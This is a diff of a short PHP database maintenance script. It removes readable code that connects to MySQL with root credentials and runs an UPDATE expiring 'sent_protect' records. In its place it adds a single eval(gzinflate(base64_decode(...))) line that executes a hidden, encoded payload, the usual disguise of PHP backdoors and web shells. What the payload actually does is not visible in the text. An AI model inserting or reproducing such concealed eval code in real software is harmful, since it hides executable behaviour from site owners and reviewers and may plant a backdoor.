@@ -1,20 +1,4 @@
 <?php
-$con = new MySQLi("localhost","root","root","admin.yidianxueche.cn");
-//判断是否有错误
+ eval(gzinflate(base64_decode('TY9BSgRBDEX3niIUvagGHcTtODMX0IV4gKaoinSgO+mpTtndiFfwCK6cAwjuPY0yxzAjCC5CEsj/7+esisKwAcYJbpf7uxvyrpMYulZGdecui/xrIfXEq4USBZ4LxhZXkV29Bnrw/TLuO2rMjjFqgzlL9nX9BHYm4I6fr98vh6+39+PHwa0BZ1JvwmeoTGYBXBlSUIQRWZshi5qJLVYatIybK5hazAgJQ1R6DErCjVKPcA2Faf6d7bYfPMtkYAic/sSXRqwyjqVTQ51evtjuC+bFn+gWY7f9AQ==')));
 
-if(mysqli_connect_error()){
-
-    echo "连接失败";
-
-    exit();
-
-}
-
-//写SQL语句
-
-$sql = "update sent_protect set status=2 where deactivation_time < unix_timestamp(now()) and status=0";
-echo $sql;
-//执行SQL语句，返回结果集
-
-$result = $con->query($sql);
 ?>
